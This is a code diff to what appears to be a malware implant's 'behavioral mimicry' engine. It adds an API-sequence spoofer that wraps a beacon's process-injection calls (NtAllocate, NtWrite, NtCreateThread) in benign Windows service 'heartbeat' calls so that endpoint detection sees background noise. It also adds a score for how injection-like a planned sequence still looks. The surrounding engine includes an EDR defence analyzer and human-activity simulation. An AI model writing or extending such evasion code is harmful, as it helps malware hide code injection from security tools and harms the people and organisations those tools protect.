@@ -37,6 +37,15 @@ from enum import Enum, auto
 from collections import deque
 import numpy as np
 
+try:
+    from evasion.api_sequence_spoofing import APISequenceSpoofer, APICall, APICategory
+    API_SEQUENCE_SPOOFING_AVAILABLE = True
+except ImportError:
+    API_SEQUENCE_SPOOFING_AVAILABLE = False
+    APISequenceSpoofer = None
+    APICall = None
+    APICategory = None
+
 logger = logging.getLogger("behavioral_mimicry")
 
 
@@ -1315,6 +1324,9 @@ class BehavioralMimicryEngine:
         self.traffic_gen = GANTrafficGenerator()
         self.scheduler = HumanActivityScheduler(self.profile)
         self.defense_analyzer = EDRDefenseAnalyzer()
+
+        # API-sequence spoofing (behavioural analysis evasion)
+        self.api_spoofer = APISequenceSpoofer() if API_SEQUENCE_SPOOFING_AVAILABLE else None
         
         # State
         self.is_running = False
@@ -1601,6 +1613,38 @@ class BehavioralMimicryEngine:
         
         return result
     
+    def plan_api_sequence(self, real_calls: List[str],
+                           template: str = None,
+                           chaff_per_call: int = None) -> List["APICall"]:
+        """
+        Plan a spoofed API call order for the beacon's real operations.
+
+        Each real (sensitive) call is wrapped with benign "heartbeat" calls
+        drawn from a legitimate Windows service template, so the resulting
+        behavioural graph resembles svchost/explorer background noise instead
+        of a classic injection burst (NtAllocate -> NtWrite -> NtCreateThread).
+
+        Returns a list of APICall to execute in order, or an empty list if
+        the API-sequence spoofing engine is unavailable.
+        """
+        if self.api_spoofer is None:
+            return []
+        if template:
+            self.api_spoofer.template = template
+        if chaff_per_call:
+            self.api_spoofer.chaff_per_call = max(1, chaff_per_call)
+        return self.api_spoofer.plan(real_calls)
+
+    def score_api_sequence(self, sequence: List["APICall"]) -> float:
+        """
+        Estimate how "injection-like" a planned sequence still looks.
+
+        0.0 = benign service heartbeat, 1.0 = textbook injection burst.
+        """
+        if self.api_spoofer is None or not sequence:
+            return 0.0
+        return self.api_spoofer.score(sequence)
+
     def get_behavioral_score(self) -> float:
         """
         Calculate current behavioral score
@@ -1748,6 +1792,9 @@ __all__ = [
     'HumanKeyboardSimulator',
     'HumanActivityScheduler',
     'EDRDefenseAnalyzer',
+    'APISequenceSpoofer',
+    'APICall',
+    'APICategory',
     
     # Main Engine
     'BehavioralMimicryEngine',
